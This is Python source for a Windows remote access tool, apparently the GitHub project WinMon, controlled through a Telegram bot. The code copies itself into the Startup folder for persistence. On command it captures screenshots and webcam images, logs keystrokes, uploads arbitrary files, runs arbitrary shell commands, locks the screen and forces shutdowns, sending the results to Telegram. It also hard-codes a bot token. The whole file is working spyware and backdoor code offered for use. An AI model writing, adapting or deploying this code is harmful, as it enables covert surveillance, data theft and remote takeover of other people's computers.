"""
██╗    ██╗██╗███╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗           ██████╗ ██╗   ██╗
██║    ██║██║████╗  ██║████╗ ████║██╔═══██╗████╗  ██║           ██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║██║██╔██╗ ██║██╔████╔██║██║   ██║██╔██╗ ██║           ██████╔╝ ╚████╔╝ 
██║███╗██║██║██║╚██╗██║██║╚██╔╝██║██║   ██║██║╚██╗██║           ██╔═══╝   ╚██╔╝  
╚███╔███╔╝██║██║ ╚████║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║    ██╗    ██║        ██║   
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝    ╚═╝        ╚═╝   
                                                                                  -Github@PavanMeka09
"""
import os, sys, subprocess, importlib

def install_missing_packages():
    reqs = [
        ("telebot", "pyTelegramBotAPI"),
        ("keyboard", "keyboard"),
        ("pyautogui", "pyautogui"),
        ("pyttsx3", "pyttsx3"),
        ("cv2", "opencv-python"),
        ("PIL", "Pillow")
    ]
    missing = [pkg for mod, pkg in reqs if importlib.util.find_spec(mod) is None]
    if missing:
        for pkg in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
        os.execv(sys.executable, [sys.executable] + sys.argv)

install_missing_packages()

import subprocess, telebot, socket, platform, os, sys, shutil, time, threading, io, importlib, ctypes
from tkinter import messagebox
import tkinter
import keyboard
import pyautogui
import pyttsx3
import cv2
from PIL import Image

approved_users = [7362343267, 1234567890]
vol_running = False
keylog_running = False
block_win = None

TOKEN = "7691063942:AAHSZV0wAu7DjPNBkH1xSpVGWKoa5__7w6g"
bot = telebot.TeleBot(TOKEN)
pyautogui.FAILSAFE = False
username = os.getenv("USERNAME")
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startup_status = "False (❌)"

def add_to_startup():
    global startup_status
    dest = os.path.join(startup_folder, "WinMon.exe")
    if not os.path.exists(dest):
        try:
            shutil.copy("WinMon.exe", startup_folder)
            startup_status = "True (✅)"
        except Exception:
            startup_status = "False (❌)"
    else:
        startup_status = "True (✅)"

def start_bot():
    @bot.message_handler(commands=["start"])
    def start(message):
        if message.from_user.id in approved_users:
            os.chdir(startup_folder)
            send_device_info(message)
            register_message_handlers()
        else:
            bot.send_message(message.chat.id, "Not authorized (❌)")

    def send_device_info(message):
        info = (f"<b>Device:</b> {socket.gethostname()} (👤)\n"
                f"<b>Status:</b> Running (✅)\n"
                f"<b>IPv4:</b> {socket.gethostbyname(socket.gethostname())} (🌐)\n"
                f"<b>OS:</b> {platform.platform()}\n"
                f"<b>Startup:</b> {startup_status}\n"
                "Use /help for commands.\n\n"
                "<a href='https://github.com/PavanMeka09/WinMon'>Source Code</a>\n"
                "Developed by @PavanMeka99")
        bot.send_message(message.chat.id, info, parse_mode="HTML", disable_web_page_preview=True)

    def register_message_handlers():
        @bot.message_handler(commands=["help"])
        def help_cmd(message):
            cmds = ("*Commands:*\n"
                    "/alert {msg}\n"
                    "/blockscreen {msg}\n"
                    "/stop (to stop continous actions)\n"
                    "/ss\n"
                    "/webcam\n"
                    "/tts {msg}\n"
                    "/maxvol\n"
                    "/minvol\n"
                    "/grab {path}\n"
                    "/keylog\n"
                    "/cd {path}\n"
                    "/cmd {command}\n"
                    "/reboot\n"
                    "/lock\n"
                    "/logoff\n"
                    "/restart\n"
                    "/shutdown\n"
                    "/exit\n"
                    "/implode\n")
            bot.send_message(message.chat.id, cmds, parse_mode="Markdown")

        @bot.message_handler(func=lambda m: m.text and m.text.startswith("/alert"))
        def alert(message):
            msg = message.text.replace("/alert ", "", 1)
            if msg in ["/alert ", "/alert"]:
                msg = 'alert'
            bot.send_message(message.chat.id, "Executed")
            messagebox.showinfo("Alert", msg)

        @bot.message_handler(commands=["webcam"])
        def webcam(message):
            sm = bot.send_message(message.chat.id, "Capturing... (⌛)")
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                cv2.imwrite("image.jpg", frame)
                with open("image.jpg", "rb") as img:
                    bot.send_photo(message.chat.id, img)
                os.remove("image.jpg")
                bot.edit_message_text("Captured (✅)", message.chat.id, sm.message_id)
            else:
                bot.send_message(message.chat.id, "Failed to capture image.")

        @bot.message_handler(func=lambda m: m.text and m.text.startswith("/blockscreen"))
        def blockscreen(message):
            global block_win
            msg = message.text.replace("/blockscreen ", "", 1)
            if msg in ["/blockscreen ", "/blockscreen"]:
                msg = ""
            bot.send_message(message.chat.id, "Screen blocked. Use /stop to unblock.")

            def action_blocker():
                pyautogui.moveTo(0, 0)
                pyautogui.press("esc")
                block_win.after(10, action_blocker)

            block_win = tkinter.Tk()
            block_win.overrideredirect(True)
            block_win.wm_attributes("-topmost", True)
            block_win.geometry("%dx%d+0+0" % (block_win.winfo_screenwidth(), block_win.winfo_screenheight()))

            lbl = tkinter.Label(block_win, text=msg, font=("Arial", 50), fg="red")
            lbl.pack(expand=True)

            action_blocker()
            block_win.mainloop()

        @bot.message_handler(commands=["ss"])
        def screenshot(message):
            sm = bot.send_message(message.chat.id, "Taking screenshot... (⌛)")
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format="JPEG")
            buf.seek(0)
            bot.send_photo(message.chat.id, buf)
            bot.edit_message_text("Screenshot sent (✅)", message.chat.id, sm.message_id)

        @bot.message_handler(func=lambda m: m.text and m.text.startswith("/url"))
        def open_url(message):
            msg = message.text.replace("/url ", "", 1)
            if msg in ["/url ", "/url"]:
                bot.send_message(message.chat.id, "Invalid url")
            else:
                os.system(f'start "" "{msg}"')
                bot.send_message(message.chat.id, "URL Opened")
        
        @bot.message_handler(commands=["maxvol"])
        def maxvol(message):
            global vol_running
            if not vol_running:
                vol_running = True
                bot.send_message(message.chat.id, "Increasing volume... Use /stop to halt.")
                def vol_up():
                    while vol_running:
                        pyautogui.press("volumeup")
                        time.sleep(0.1)
                threading.Thread(target=vol_up, daemon=True).start()

        @bot.message_handler(commands=["minvol"])
        def minvol(message):
            global vol_running
            if not vol_running:
                vol_running = True
                bot.send_message(message.chat.id, "Decreasing volume... Use /stop to halt.")
                def vol_down():
                    while vol_running:
                        pyautogui.press("volumedown")
                        time.sleep(0.1)
                threading.Thread(target=vol_down, daemon=True).start()

        @bot.message_handler(func=lambda m: m.text and m.text.startswith("/tts"))
        def tts(message):
            text = message.text.replace("/tts ", "", 1)
            engine = pyttsx3.init()
            engine.setProperty("rate", 100)
            engine.setProperty("volume", 1.0)
            engine.say(text)
            engine.runAndWait()
            bot.send_message(message.chat.id, "Executed")

        @bot.message_handler(func=lambda message: "/grab" in message.text)
        def grab(message):
            sm = bot.send_message(message.chat.id, "Grabbing...(⌛)")
            path = message.text.replace("/grab ", "")
            if os.path.exists(path):
                with open(path, "rb") as doc:
                    bot.send_document(message.chat.id, doc)
                    bot.edit_message_text("Grabbed Successfully(✅)", message.chat.id, sm.message_id)
            else:
                bot.send_message(message.chat.id, "Invalid File Path (❌)")

        @bot.message_handler(commands=["keylog"])
        def keylog(message):
            global keylog_running
            keylog_running = True
            pressed_keys = ""
            msg = bot.send_message(message.chat.id, "*Listening:*", parse_mode="Markdown")
            bot.send_message(message.chat.id, "Use /stop to stop Listening")
            
            def on_press(event):
                nonlocal pressed_keys
                if not keylog_running:
                    return
                key_name = event.name.replace("space", " ").replace("ctrl", " {ctrl} ").replace("back", " {back} ").replace("alt", " {alt} ").replace("tab", " {tab} ")
                pressed_keys += key_name
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"*Listening:*\n{pressed_keys}", parse_mode="Markdown")
            
            keyboard.on_press(on_press)

        @bot.message_handler(func=lambda message: "/cmd" in message.text)
        def cmd(message):
            command = message.text.replace("/cmd ", "")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = f"*Output:*\n{result.stdout}" if result.stdout else f"*Error:*\n\n{result.stderr}"
            bot.send_message(message.chat.id, output, parse_mode="Markdown")

        @bot.message_handler(func=lambda m: m.text and m.text.startswith("/cd"))
        def cd(message):
            directory = message.text.replace("/cd ", "", 1)
            if os.path.exists(directory):
                os.chdir(directory)
                bot.send_message(message.chat.id, "Directory changed (♻️)")
            else:
                bot.send_message(message.chat.id, "Invalid directory (❌)")

        @bot.message_handler(commands=["reboot"])
        def reboot(message):
            bot.send_message(message.chat.id, "Rebooting...")
            os.execl(sys.executable, sys.executable, *sys.argv)

        @bot.message_handler(commands=["lock"])
        def handle_lock(message):
            bot.send_message(message.chat.id, "Locked")
            os.system("rundll32.exe user32.dll,LockWorkStation")

        @bot.message_handler(commands=["logoff"])
        def handle_logoff(message):
            bot.send_message(message.chat.id, "Logged Off")
            os.system("shutdown /l")

        @bot.message_handler(commands=["restart"])
        def restart(message):
            bot.send_message(message.chat.id, "Restarting...")
            os.system("shutdown -r -t 0")

        @bot.message_handler(commands=["shutdown"])
        def shutdown(message):
            bot.send_message(message.chat.id, "Shutting down...")
            os.system("shutdown -s -t 0")

        @bot.message_handler(commands=["exit"])
        def exit_bot(message):
            bot.send_message(message.chat.id, "Bot stopping...")
            os.system("taskkill /f /IM WinMon.exe")

        @bot.message_handler(commands=["implode"])
        def implode(message):
            bot.send_message(message.chat.id, f"Type !{socket.gethostname()} to confirm self-destruct.")

        @bot.message_handler(func=lambda m: m.text == f"/{socket.gethostname()}")
        def confirm_implode(message):
            bot.send_message(message.chat.id, "Self-destruct initiated (☠️)")
            dest = os.path.join(startup_folder, "WinMon.exe")
            subprocess.call(["taskkill", "/f", "/IM", "WinMon.exe"])
            try:
                os.remove(dest)
                bot.send_message(message.chat.id, "Removed from startup.")
            except Exception as e:
                bot.send_message(message.chat.id, f"Failed to remove: {e}")
            os._exit(0)

        @bot.message_handler(commands=["stop"])
        def stop_actions(message):
            global vol_running, keylog_running, block_win
            vol_running = False
            keylog_running = False
            keyboard.unhook_all()
            if block_win:
                try:
                    block_win.destroy()
                except Exception:
                    pass
                block_win = None
            bot.send_message(message.chat.id, "Stopped all actions.")

        @bot.message_handler(func=lambda m: True)
        def invalid(message):
            bot.reply_to(message, "Invalid command, use !help for list.")

    bot.infinity_polling()

if __name__ == "__main__":
    add_to_startup()
    start_bot()